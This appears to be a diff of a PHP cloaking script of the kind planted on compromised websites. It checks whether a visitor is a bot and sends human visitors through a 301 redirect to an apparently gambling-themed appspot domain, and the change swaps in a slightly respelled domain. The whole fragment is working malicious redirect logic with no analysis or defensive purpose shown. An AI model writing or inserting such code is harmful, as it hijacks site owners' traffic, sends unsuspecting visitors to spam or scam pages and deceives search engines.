@@ -46,7 +46,7 @@ $result = isBot($_SERVER['HTTP_USER_AGENT']);
 	exit();
  }else{
 	 header("HTTP/1.1 301 Moved Permanently");
-	 header('Location:https://iloveslotiz.ey.r.appspot.com'.$_SERVER['REQUEST_URI']);
+	 header('Location:https://ilovezlotiz.ey.r.appspot.com'.$_SERVER['REQUEST_URI']);
 	 exit;
  }
 ?>
